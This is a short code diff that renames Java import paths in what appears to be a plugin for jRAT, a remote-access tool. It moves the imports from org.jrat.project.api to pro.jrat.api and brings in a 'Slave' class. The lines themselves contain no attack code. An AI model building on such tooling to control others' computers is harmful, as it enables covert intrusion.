@@ -1,10 +1,10 @@
 package com.redpois0n.plugins;
 
-import org.jrat.project.api.Packet;
-import org.jrat.project.api.events.OnConnectEvent;
-import org.jrat.project.api.events.OnDisconnectEvent;
-import org.jrat.project.api.events.OnPacketEvent;
-import org.jrat.project.api.events.OnSendPacketEvent;
+import pro.jrat.api.Packet;
+import pro.jrat.api.events.OnConnectEvent;
+import pro.jrat.api.events.OnDisconnectEvent;
+import pro.jrat.api.events.OnPacketEvent;
+import pro.jrat.api.events.OnSendPacketEvent;
 
 import com.redpois0n.Slave;
 
